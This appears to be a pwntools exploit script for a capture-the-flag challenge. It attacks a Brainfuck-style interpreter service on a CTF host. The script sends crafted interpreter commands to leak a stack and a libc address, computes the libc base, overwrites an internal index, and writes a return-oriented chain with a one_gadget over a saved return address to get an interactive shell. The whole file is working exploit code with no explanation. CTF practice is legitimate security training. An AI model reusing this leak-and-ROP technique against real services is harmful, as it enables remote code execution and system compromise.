from pwn import *

def send_bytes(x):
	x = x.to_bytes(8, 'little')
	target.send(x[7:8])
	target.send(x[6:7])
	target.send(x[5:6])
	target.send(x[4:5])
	target.send(x[3:4])
	target.send(x[2:3])
	target.send(x[1:2])
	target.send(x[0:1])

target = remote("uptoyou.ctf.secso.cc", "5005")
libc = ELF("./libc.so.6")


payload = "[["

#leak stack address
payload += "<"*0x9
payload += ".<"*0x8

#leak libc address
payload += "<"*80
payload += ".<"*8

###point cur_bracket to mem_index
payload += ">"
payload += "<"*0x10c
payload += ",<"*4
##
###set the top 4 bytes of mem_index to 0
payload += ">"
###set bottom 4 to length of program up to this point (0x192 currently)
payload += "["
##
##
###point to return address of emulate_game
#payload += "<"*(0x190-0x148-0x10+2)
payload += "<"*(2)
payload += ",<"*120



print("length of payload is {}".format(len(payload)))
target.sendline(str(len(payload)))
target.send(payload)

target.recv()
target.recv()
target.recv()
data =target.recv()

print(data)

stack_leak = data[:8]
stack_leak = int.from_bytes(stack_leak, byteorder='big')

mem_index = stack_leak + 0x48

libc_leak = data[8:]
libc_leak = int.from_bytes(libc_leak, byteorder='big')

#minor error handling
if libc_leak == 0:
	print("cringe, we are exiting")
	exit()

libc.address = libc_leak -0x94098
one_shot = libc.address + 0x4f302
p_rsi = libc.address + 0x23a6a
p_rdx_rbx = libc.address + 0x11c35c
print("data is {}".format(data))
print("stack_leak is {:x}".format(stack_leak))
print("libc_leak is {:x}".format(libc_leak))
print("libc base believed to be {:x}".format(libc.address))

mem_index = mem_index.to_bytes(8, 'little')
print(mem_index)
target.send(mem_index[3:4])
target.send(mem_index[2:3])
target.send(mem_index[1:2])
target.send(mem_index[:1])


#
##overwrites saved rip of main to one_shot
# The extra 0's after the one_shot are to satisfy the condition [rsp+0x40] == 0
send_bytes(0)
send_bytes(0)
send_bytes(0)
send_bytes(0)
send_bytes(0)
send_bytes(0)
send_bytes(0)
send_bytes(0)
send_bytes(0)
send_bytes(one_shot)
send_bytes(0)
send_bytes(0)
send_bytes(p_rdx_rbx)
send_bytes(0)
send_bytes(p_rsi)





target.interactive()
